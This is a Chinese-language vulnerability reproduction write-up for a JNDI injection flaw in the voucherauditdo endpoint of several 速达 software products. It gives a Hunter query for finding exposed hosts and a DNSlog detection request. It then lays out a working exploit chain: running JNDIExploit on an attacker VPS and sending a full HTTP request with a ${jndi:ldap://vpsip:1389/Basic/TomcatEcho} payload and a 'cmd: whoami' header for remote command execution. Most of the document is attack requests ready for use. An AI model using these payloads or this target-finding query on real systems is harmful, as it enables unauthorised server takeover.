# 速达软件技术（广州）有限公司多款产品voucherauditdo存在JNID注入漏洞

# 一、漏洞简介
速达软件技术（广州）有限公司多款产品voucherauditdo存在JNID注入漏洞,攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 速达软件技术（广州）有限公司多款产品

# 三、资产测绘
+ hunter`web.body="速达软件技术（广州）有限公司"`
+ 特征

![1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5.png](./img/TlMETPa1inTIybRs/1699201284929-aa4ce68c-746e-4b42-b2a6-5ee57011daf5-675709.png)

![1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae.png](./img/TlMETPa1inTIybRs/1699201312048-19df152b-1307-4860-87ac-d74fe2d646ae-994840.png)

# 四、漏洞复现
1. 获取dnslog

```plain
g58b0k.dnslog.cn
```

![1705075159021-2f829661-f6a2-4877-a2e3-d16320f8cac1.png](./img/TlMETPa1inTIybRs/1705075159021-2f829661-f6a2-4877-a2e3-d16320f8cac1-536627.png)

2. 检测是否存在漏洞

```plain
GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://g58b0k.dnslog.cn} HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```

![1705075219543-d6f88494-a50a-487a-a203-e1cca93f0077.png](./img/TlMETPa1inTIybRs/1705075219543-d6f88494-a50a-487a-a203-e1cca93f0077-736341.png)

![1705075233260-58dbace8-b56d-4880-b43e-73f2be788dbe.png](./img/TlMETPa1inTIybRs/1705075233260-58dbace8-b56d-4880-b43e-73f2be788dbe-552308.png)

漏洞利用

[JNDIExploit-1.4-SNAPSHOT.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222146450-e43931b2-c4c5-4cf5-859c-4328905c634c.jar)

将`JNDIExploit-1.4-SNAPSHOT.jar`上传到`vps`

```plain
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vpsip
```

![1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb.png](./img/TlMETPa1inTIybRs/1705075364344-caf730e8-f910-4617-87ae-297aec05dbeb-414644.png)

```plain
GET /account/voucher/voucherauditdo!toEdit.action?billId=${jndi:ldap://vpsip:1389/Basic/TomcatEcho} HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cmd: whoami
Cookie: JSESSIONID=95B4E05547D0C692CF0D0DD69AC5241B
Connection: close
```

![1705075417091-bed33e43-e858-400a-86f9-6a14714033ca.png](./img/TlMETPa1inTIybRs/1705075417091-bed33e43-e858-400a-86f9-6a14714033ca-450138.png)





> 更新: 2024-02-29 23:55:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yfgdget075d9tggf>